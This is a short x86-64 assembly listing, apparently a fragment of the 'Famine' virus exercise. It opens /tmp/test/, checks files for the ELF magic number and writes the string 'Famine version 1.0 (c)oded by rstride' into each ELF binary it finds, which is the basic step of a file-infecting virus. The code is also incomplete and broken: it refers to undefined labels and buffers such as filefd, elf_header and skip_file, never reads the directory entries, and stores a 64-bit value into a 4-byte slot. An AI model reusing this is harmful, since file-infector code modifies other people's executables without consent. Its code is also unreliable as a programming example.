section .data
    directory db "/tmp/test/", 0
    signature db "Famine version 1.0 (c)oded by rstride", 0

section .bss
    dirfd resb 4               ; File descriptor for the directory

section .text
    global _start

_start:
    ; Open the directory
    mov rax, 2                 ; Syscall for 'open'
    mov rdi, directory          ; Directory path
    xor rsi, rsi                ; Flags: read-only
    syscall                     ; Make the syscall
    mov [dirfd], rax            ; Store the directory file descriptor

    ; Check if the directory was opened successfully
    cmp rax, 0
    js _exit                    ; If less than 0, exit (error)

    ; Proceed to read directory contents here...
    jmp check_elf

check_elf:
    ; Open the file, check the ELF header (magic number 0x7f 'E' 'L' 'F')
    mov rax, 0                  ; Syscall for 'read'
    mov rdi, [filefd]            ; File descriptor for the binary
    mov rsi, elf_header          ; Buffer to store the ELF header
    mov rdx, 4                   ; Read first 4 bytes
    syscall                      ; Perform the read

    ; Check the ELF magic number
    cmp dword [elf_header], 0x464c457f
    jne skip_file                ; If not ELF, skip this file

inject_signature:
    ; Write the signature at the end of the file
    mov rax, 1                  ; Syscall for 'write'
    mov rdi, [filefd]            ; File descriptor for the binary
    mov rsi, signature           ; Signature string
    mov rdx, signature_length    ; Length of the signature
    syscall                      ; Perform the write

    ; Proceed to close the file and move to the next one...

_exit:
    mov rax, 60                 ; Syscall for 'exit'
    xor rdi, rdi                ; Exit code 0
    syscall
